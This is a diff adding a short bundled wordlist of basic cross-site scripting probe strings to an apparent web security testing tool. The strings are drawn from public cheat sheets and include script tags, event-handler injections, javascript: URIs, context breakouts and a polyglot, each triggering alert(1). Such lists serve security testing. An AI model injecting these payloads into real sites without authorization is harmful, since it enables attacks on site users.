@@ -1,0 +1,30 @@
+# burpsy bundled wordlist: XSS probe strings (basic)
+# Source: publicly documented industry-standard XSS probes (OWASP XSS Filter Evasion
+#   Cheat Sheet, PayloadAllTheThings' XSS section).
+# Licence basis: public domain / permissively-licensed community content; nothing here is
+#   extracted from PortSwigger's shipped resources.
+<script>alert(1)</script>
+<script src=//x></script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<a href="javascript:alert(1)">x</a>
+<div onmouseover="alert(1)">x</div>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen autofocus onfocus=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+-alert(1)-/*
+</title><script>alert(1)</script>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
